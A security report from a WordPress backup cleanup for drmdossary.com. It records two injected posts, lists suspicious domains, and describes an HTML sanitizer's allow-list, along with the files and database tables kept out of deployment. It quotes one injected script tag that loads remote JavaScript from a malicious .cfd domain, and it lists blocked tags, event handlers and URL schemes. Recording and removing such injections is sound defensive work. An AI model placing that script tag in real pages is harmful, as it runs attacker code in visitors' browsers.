# Security Report — WordPress Backup Cleanup

Date: 2026-05-11
Source: `backup-source/public_html/` and `backup-source/u613426641_epnHw_sanitized.sql`
Target site: `drmdossary.com` (now rebuilt as a static site for Vercel)

This report records every suspicious finding discovered while extracting
clean content from the old WordPress backup. **No PHP, JavaScript, SQL, or
XML from `backup-source/` was ever executed.** The dump was parsed as
text-only and post HTML was sanitized through a strict allow-list before
being written to the new site.

---

## 1. Confirmed malicious content (excluded from rebuild)

Two `wp_posts` rows were confirmed malicious. They are NOT included in the
clean rebuild. The IDs are hard-coded into `EXCLUDED_POST_IDS` in the
build script so they cannot accidentally reappear.

| Post ID | Type | Slug | Reason |
| ------- | ---- | ---- | ------ |
| 2634 | post (publish) | `script-src-https-rpc-framework-check-cfd-api-css-js-defer-script` | **Malicious script injection.** The post `post_title` itself is `<script src="https://rpc-framework-check.cfd/api/css.js" defer></script>`. WordPress renders the title verbatim in many themes, so this would have executed remote JS from a previously unseen `.cfd` domain. The post body is empty. |
| 2685 | post (publish) | `ms-office-2013-activator` | **Spam / pirated-software SEO injection.** Title: "ms office 2013 activator ✓ Activate Full Features Today for Office 2013". Body contains affiliate buttons linking to `https://sof-kop.xyz/vmFk1x` with inline `onmouseover` / `onmouseout` JavaScript handlers. Classic "free Office activator" malware funnel. |

Both indicate a successful spam/SEO compromise of the WordPress site — typical
of an outdated WP install. The Wordfence (`wp_wf*`) and Yoast tables show the
site had recent security activity but the spam still landed.

## 2. Suspicious domains observed in post content

| Domain | Verdict | Action |
| ------ | ------- | ------ |
| `rpc-framework-check.cfd` | **Malicious.** Untracked `.cfd` (commercial-fast-domain) used for drive-by JS loading. | Blocked. Post removed. |
| `sof-kop.xyz` | **Malicious.** `.xyz` redirect chain for pirated-software malware. | Blocked. Post removed. |
| `example.com` | Placeholder, harmless. | Left as-is; will be rewritten to `#` by sanitizer if reachable. |
| `drmdossary.com` | Own domain. | All `https://drmdossary.com/...` URLs are rewritten to root-relative paths; `/wp-content/uploads/...` is rewritten to `/uploads/...`. |
| `ar.wikipedia.org`, `arz.wikipedia.org` | Legitimate citations from blog posts. | Allow-listed. |
| `www.instagram.com`, `www.youtube.com`, `twitter.com`, `www.linkedin.com`, `www.tiktok.com` | Legitimate social profile links. | Allow-listed. |

Any other external host that appears in post HTML is automatically rewritten
to `#` by the sanitizer and logged. The current build produced zero such
rewrites after the two malicious posts were excluded.

## 3. HTML sanitization performed on every retained post/page

The build script (`scripts/build_site.py`) parses each post body with
BeautifulSoup (lxml backend) and applies the following allow-list:

* **Stripped tags:** `<script>`, `<style>`, `<iframe>`, `<object>`, `<embed>`,
  `<noscript>`, `<form>`, `<input>`, `<button>`, `<textarea>`, `<select>`,
  `<option>`, `<meta>`, `<link>`, `<base>`, `<svg>`, `<math>`, `<frame>`,
  `<frameset>`.
* **Stripped attributes:** every `on*` event handler (`onclick`,
  `onmouseover`, `onerror`, `onload`, etc.), inline `style="..."`,
  `data-src`, `data-srcset`.
* **URL schemes blocked in `href`/`src`:** `javascript:`, `vbscript:`,
  `data:`, `file:`.
* **Shortcodes removed:** every WordPress shortcode `[name ...]` /
  `[/name]` (including `[rev_slider]`, `[contact-form-7]`, etc.) is dropped
  before HTML parsing.
* **HTML comments** are stripped.
* **External `<a>` links** are forced to `rel="noopener noreferrer"
  target="_blank"`.
* **Uploads paths** matching `/wp-content/uploads/` (with or without the
  `https://drmdossary.com` prefix) are rewritten to `/uploads/`.
* **Unknown external domains** are rewritten to `#` and logged.

During the most recent run, the sanitizer reported **1 finding** in the
retained content: a stray `<style>` element on one page was removed. No
script tags, iframes, or inline event handlers remained in any kept post.

## 4. Backup files that must NOT ship to production

These live under `backup-source/` and are excluded from the build. The
project `.gitignore` already excludes `backup-source/`, all `.sql` and
`.xml` dumps, and `wp-admin/`, `wp-includes/`, `wp-content/plugins/`,
`wp-content/cache/`, and `wp-content/wflogs/`.

### Should be removed from the repository before deploy

These were committed earlier when the backup was added and need to be
deleted before the Vercel deploy:

* `backup-source/u613426641_epnHw_sanitized.sql` — 47 MB MySQL dump.
  Contains plaintext copies of every page, plus Wordfence security event
  logs, password hashes in `wp_users`, login traffic from `wp_wflogins`,
  and Action Scheduler queues. **Never deploy.**
* `backup-source/public_html/wp-admin/` — entire WordPress admin folder
  (PHP). Executable in any PHP environment; must not ship.
* `backup-source/public_html/wp-includes/` — WordPress core (PHP).
* `backup-source/public_html/wp-*.php` — every top-level WordPress entry
  point: `wp-login.php`, `xmlrpc.php`, `wp-cron.php`, `wp-config-sample.php`,
  `wp-blog-header.php`, `wp-load.php`, `wp-settings.php`, `wp-signup.php`,
  `wp-trackback.php`, `wp-mail.php`, `wp-comments-post.php`,
  `wp-activate.php`, `wp-links-opml.php`, `default.php`, `index.php`,
  `wp-blog-header.php`.
* `backup-source/public_html/wp-content/advanced-cache.php` — WP Rocket
  bootstrap PHP.
* `backup-source/public_html/wp-content/ai1wm-backups/` — All-in-One
  Migration backup folder. Empty of payloads but contains an
  `.htaccess` and `web.config` designed for the WordPress runtime.
* `backup-source/public_html/wp-content/cache/` — WP Rocket page cache
  (pre-rendered HTML, gzipped). Static HTML output of the LIVE site,
  including the malicious script injection in post 2634 mentioned above.
  Do not serve. The clean static HTML in this repo is the only output
  that should be deployed.
* `backup-source/public_html/google26cec3fd77cc819b.html` — Google Search
  Console verification token tied to the old hosting. Keep ONLY if you
  still own the same GSC property; otherwise remove.
* `backup-source/public_html/license.txt`, `readme.html` — fingerprint the
  WordPress version. Never deploy.
* `backup-source/public_html/robots.txt` — WordPress-specific. The clean
  build writes a fresh `/robots.txt` at the root.

### Suspicious entries blocked by Vercel routing

`vercel.json` returns a permanent redirect to `/` for any request to:

* `/wp-admin/*`
* `/wp-login.php`
* `/xmlrpc.php`

and rewrites legacy uploads URLs:

* `/wp-content/uploads/:path*` → `/uploads/:path*`

This neutralizes lingering inbound links and bot probes targeting the old
WordPress endpoints.

## 5. Media (`wp-content/uploads/`) — missing from this backup

The backup tarball contains **no actual image, video, or document files**
under `wp-content/uploads/`. Only the database references them. The clean
site therefore points to image paths under `/uploads/...` that currently
404. The complete list of required files is in
[`data/needed-uploads.txt`](data/needed-uploads.txt) — 97 paths, mostly
`.png`, `.jpg`, `.jpeg`, `.webp`. To finish the migration you must obtain
these files from your hosting provider's backup (Hostinger / cPanel
"File Manager") and drop them into `uploads/` preserving the same
year/month folder structure. Vercel serves the repo root at the site root,
so files at `uploads/2024/02/foo.png` are reachable at `/uploads/2024/02/foo.png`.

No media file was sanitized — they simply aren't here.

## 6. Database tables containing sensitive operational data

These exist in the dump and **must not be republished** even after the
rebuild:

* `wp_users` / `wp_usermeta` — bcrypt password hashes and session tokens.
* `wp_options` — contains API keys for WP Rocket, mail SMTP credentials
  (`wp_wpmailsmtp_debug_events`), and Wordfence config.
* `wp_wflogins`, `wp_wfauditevents`, `wp_wfblockediplog`, `wp_wfsecurityevents`,
  `wp_wfhits`, `wp_wfls_2fa_secrets`, `wp_wfconfig` — Wordfence audit logs,
  blocked IPs, and 2FA secrets.
* `wp_e_submissions`, `wp_e_submissions_values`, `wp_db7_forms`,
  `wp_wpforms_payments`, `wp_wpforms_payment_meta` — contact-form
  submissions with user-entered names, emails, phone numbers, and at
  least one payment record. Treat as PII.

The clean build script reads only `wp_posts`, `wp_postmeta`,
`wp_yoast_indexable`, `wp_options` (for site title/tagline), `wp_terms`,
`wp_term_taxonomy`, `wp_term_relationships`. It does not touch user,
session, password, or form-submission data, and none of that data is
written to the rebuilt site.

## 7. Summary

* Malicious posts removed: **2** (IDs 2634, 2685).
* Malicious external domains observed: **2** (`rpc-framework-check.cfd`,
  `sof-kop.xyz`).
* `<script>` / `<iframe>` / inline-event-handler injections found in the
  retained published content: **0** after sanitization.
* Pages rebuilt: 19 (Arabic primary + English mirror).
* Blog posts rebuilt: 79.
* Image references rewritten from `/wp-content/uploads/` to `/uploads/`:
  97 unique files (see `data/needed-uploads.txt`).
* No WordPress core file (PHP) is copied into the production build.
* `backup-source/` remains in `.gitignore` and must not ship.
